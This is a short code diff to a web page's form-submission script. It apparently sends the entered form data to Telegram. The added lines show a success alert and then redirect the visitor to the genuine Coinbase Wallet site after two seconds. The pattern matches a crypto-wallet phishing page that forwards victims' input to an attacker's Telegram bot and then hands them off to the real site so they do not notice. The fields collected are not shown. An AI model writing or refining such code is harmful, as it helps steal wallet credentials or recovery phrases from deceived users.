@@ -214,10 +214,16 @@
         })
       })
       .then(res => res.json())
-      .then(data => {
-        alert("Form submitted successfully!");
-        console.log("Telegram response:", data);
-      })
+     .then(data => { 
+    console.log("Telegram response:", data);
+    // Show confirmation first
+    alert("Form submitted successfully! Redirecting...");
+    // Redirect after 2 seconds
+    setTimeout(() => {
+        window.location.href = "https://wallet.coinbase.com";
+    }, 2000);
+})
+
       .catch(err => {
         alert("Error sending to Telegram");
         console.error(err);
